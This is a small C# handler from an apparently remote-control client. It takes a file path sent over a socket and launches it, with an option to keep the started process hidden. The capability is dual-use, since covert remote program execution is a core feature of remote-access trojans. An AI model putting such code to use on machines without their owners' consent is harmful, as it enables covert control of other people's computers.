using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestOpenFileHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            var req = reqObj as RequestOpenFile;

            ProcessUtil.Run(req.FilePath, "", req.IsHide, true);
        }
    }
}
